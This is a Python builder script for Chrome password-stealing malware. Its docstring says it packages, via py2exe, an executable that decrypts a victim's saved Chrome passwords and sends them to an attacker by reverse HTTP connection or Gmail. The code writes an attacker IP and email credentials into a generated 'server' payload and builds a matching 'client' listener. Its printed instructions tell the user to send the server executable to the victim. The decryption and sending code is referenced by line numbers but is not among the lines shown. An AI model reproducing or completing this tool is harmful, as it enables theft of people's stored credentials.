# -*- coding: utf-8 -*-
"""Creates an Executable that decrypts and sends Chrome passwords

This script will make use of py2exe to create an executable
version of itself, after gathering the input from the user.
The executable's functionality is to decrypt Google Chrome
saved passwords and sending them as a text file to an attacker
through reverce HTTP connection or email.

Note: To include a custom icon, the 'icon.ico' file in the directory
must be replaced by the desired one.
"""
from win32con import MB_OKCANCEL
import py2exe
from shutil import rmtree
from distutils.core import setup
import time
import sys
import os
import platform
print(platform.machine())


__author__ = "Mario Nascimento"
__license__ = "GPL"
__version__ = "4.0.0"
__maintainer__ = "Mario Nascimento"
__email__ = "marionascimento@itsec.us"
__status__ = "Development"

attacker_ip = ""
loop = True
error = "0"
email = ""
pwd = ""
mailto = ""
serverlineStart = 212
serverlineStop = 323

while loop:
    os.system("cls")
    print(
        """You are using V3.1.2\n
    Choose how you want the passwords delivered\n
    (1) - [Buggy atm] via email (only Gmail supported, example@gmail.com.
        (Make sure you turn on 'allow less secure apps')\n
    (2) - via the client.exe (to your computer directly)\n
    """
    )
    option = "2"
    if option == "1":
        appname = "server_email"
        email = input("Input your Gmail address: ")
        pwd = input("Input your Gmail password: ")
        mailto = input(
            "Input the email you want to send the passwords to. \
Leave black to send it to yourself: "
        )
        if not mailto:
            mailto = email
        loop = False
    elif option == "2":
        appname = "server_ip"
        attacker_ip = "127.0.0.1"
        loop = False

    else:
        input(
            "You must choose a value between 1 and 2. \
Enter any key to try again.."
        )


while not loop:
    error = "y"
    if error.lower() == "y" or error.lower() == "yes":
        error = "Default"
        if error is None:
            error = "1"
        os.system("cls")
        print(
            "Well done!\nThe server will be created shortly.\n\
Don't close this window"
        )
        time.sleep(2)
        loop = True

    elif error.lower() == "n" or error.lower() == "no":
        error = "0"
        os.system("cls")
        print(
            "Well done!\nThe server will be created shortly.\n\
Don't close this window"
        )
        time.sleep(2)
        loop = True
    else:
        input(
            "You must choose either Y or N. \
Enter any key to try again.."
        )


def done():
    os.system("cls")
    if option != "1":
        print(
            "\nClient has been created as 'client.exe'\n"
            + "Remember: Open this one before sending the server to the victim"
        )
    print(f"\nServer has been created as '{appname}'.exe")
    print(f"Remember: You send the '{appname}'.exe to the victim!")
    # input("Press Enter to continue...")
    exit()


def py2crypt(filename):
    sys.argv.append("py2exe")
    if filename == "client.py":
        setup(
            options={
                "py2exe": {
                    "bundle_files": 1,
                    "excludes": [
                        "pyreadline",
                        "difflib",
                        "doctest",
                        "optparse",
                        "pickle",
                    ],
                    "dll_excludes": ["msvcr71.dll", "Crypt32.dll"],
                    "compressed": True,
                    "optimize": 2,
                }
            },
            console=[{"script": filename,
                      "icon_resources": [(0, "icon.ico")]}],
            zipfile=None,
        )

        if os.path.exists("client.exe"):
            os.remove("client.exe")
        os.rename("dist/client.exe", "client.exe")
    else:
        setup(
            options={
                "py2exe": {
                    "bundle_files": 1,
                    "excludes": [
                        "pyreadline",
                        "difflib",
                        "doctest",
                        "optparse",
                        "pickle",
                    ],
                    "dll_excludes": ["msvcr71.dll", "Crypt32.dll"],
                    "compressed": True,
                    "optimize": 2,
                }
            },
            windows=[
                {
                    "script": filename,
                    "icon_resources": [(0, "icon.ico")],
                    "dest_base": appname,
                }
            ],
            zipfile=None,
            #  'uac_info': "requireAdministrator"
        )
        if os.path.exists(appname + ".exe"):
            os.remove(appname + ".exe")
        os.rename("dist/" + appname + ".exe", appname + ".exe")
        # rmtree("build/")
        rmtree("dist/")


with open("create_server.py") as f1:
    with open("server.py", "w") as f2:
        lines = f1.readlines()
        i = serverlineStart
        f2.write(
            f"# -*- coding: utf-8 -*-\n\
attacker_ip = '{attacker_ip}'\n\
option = '{option}'\n\
email = '{email}'\n\
pwd = '{pwd}'\n\
mailto = '{mailto}'\n\
error = u'{error}'\n"
        )
        while i < serverlineStop - 1:
            f2.write(lines[i])
            i = i + 1
    if option != "1":
        with open("client.py", "w") as f3:
            i += 1
            while i < len(lines) - 1:
                f3.write(lines[i])
                i = i + 1
        py2crypt("client.py")
        print("[+] Client done building... \n[+] Building server...\n")
    time.sleep(3)
    py2crypt("server.py")
    try:
        os.remove("server.py")
        os.remove("client.py")
    except Exception as err:
        pass
    done()
